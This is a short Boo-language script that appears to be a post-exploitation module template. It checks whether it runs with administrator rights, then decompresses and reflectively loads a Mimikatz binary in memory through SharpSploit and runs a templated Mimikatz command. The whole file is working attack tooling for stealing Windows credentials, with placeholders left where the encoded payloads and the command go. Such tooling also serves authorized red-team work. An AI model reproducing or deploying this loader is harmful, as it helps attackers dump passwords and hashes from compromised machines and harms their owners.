import System
import System.Reflection
import System.IO
import System.IO.Compression
import System.Security.Principal

public static def IsHighIntegrity() as bool:
    identity = WindowsIdentity.GetCurrent()
    principal = WindowsPrincipal(identity)
    return principal.IsInRole(WindowsBuiltInRole.Administrator)

public static def Decompress(compressed as (byte)) as (byte):
    using inputStream = MemoryStream(compressed.Length):
        inputStream.Write(compressed, 0, compressed.Length)
        inputStream.Seek(0, SeekOrigin.Begin)
        using outputStream = MemoryStream():
            using deflateStream = DeflateStream(inputStream, CompressionMode.Decompress):
                buffer = Array.CreateInstance(Byte, 4096)
                bytesRead = deflateStream.Read(buffer, 0, buffer.Length)
                outputStream.Write(buffer, 0, bytesRead)
                while bytesRead != 0:
                    bytesRead = deflateStream.Read(buffer, 0, buffer.Length)
                    outputStream.Write(buffer, 0, bytesRead)

                return outputStream.ToArray()

public static def Main():
    CompressedPEBytes32 = "COMPRESSED_PE_x86"
    CompressedPEBytes64 = "COMPRESSED_PE_x64"
    PELoader = "MIMI_PE_LOADER"

    if IsHighIntegrity():
        print "[+] Running in high integrity process"

        assembly = Assembly.Load(Decompress(Convert.FromBase64String(PELoader)))
        Mimikatz as duck = assembly.GetType("SharpSploit.Mimikatz")
        if IntPtr.Size == 4:
            print "[*] In 32 bit process"
            Mimikatz.Load(Decompress(Convert.FromBase64String(CompressedPEBytes32)))
        elif IntPtr.Size == 8:
            print "[*] In 64 bit process"
            Mimikatz.Load(Decompress(Convert.FromBase64String(CompressedPEBytes64)))

        print Mimikatz.Command("MIMIKATZ_COMMAND")
    else:
        print "[-] Not in high integrity process"
